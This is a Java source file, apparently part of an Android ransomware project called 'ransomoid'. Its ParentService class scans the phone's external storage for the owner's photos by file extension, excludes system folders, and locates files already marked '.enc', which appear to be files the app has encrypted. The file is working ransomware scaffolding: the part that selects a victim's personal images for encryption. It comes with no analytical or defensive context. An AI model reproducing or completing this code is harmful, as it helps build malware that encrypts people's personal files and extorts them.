package falezza.fabio.ransomoid.services;

import android.app.IntentService;
import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.widget.Toast;

import java.io.File;
import java.util.ArrayList;

import falezza.fabio.ransomoid.utils.FileProcessor;

public class ParentService extends IntentService {
    private static final String[] imgExtensions =
            {".jpg", ".jpeg", ".png", ".JPG", ".PNG", ".JPEG"};

    private static final String[] excludeExtensions = {"Android/data", ".thumbnails"};

    ArrayList<File> imgList;

    public ParentService(String name) {
        super(name);
    }


    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        FileProcessor fileProcessor = FileProcessor.getInstance();
        this.imgList = fileProcessor.getFiles(Environment.getExternalStorageDirectory(),
                imgExtensions, excludeExtensions);
    }

    protected void showMessage(final String message) {
        Handler mHandler = new Handler(getMainLooper());
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT).show();
            }
        });
    }

    protected boolean isEncrypted(File file) {
        return file.getPath().contains(".enc");
    }

    protected ArrayList<File> getEncryptedFiles() {
        return FileProcessor.getInstance().getFiles(Environment.getExternalStorageDirectory(),
                new String[]{".enc"}, excludeExtensions);
    }


}
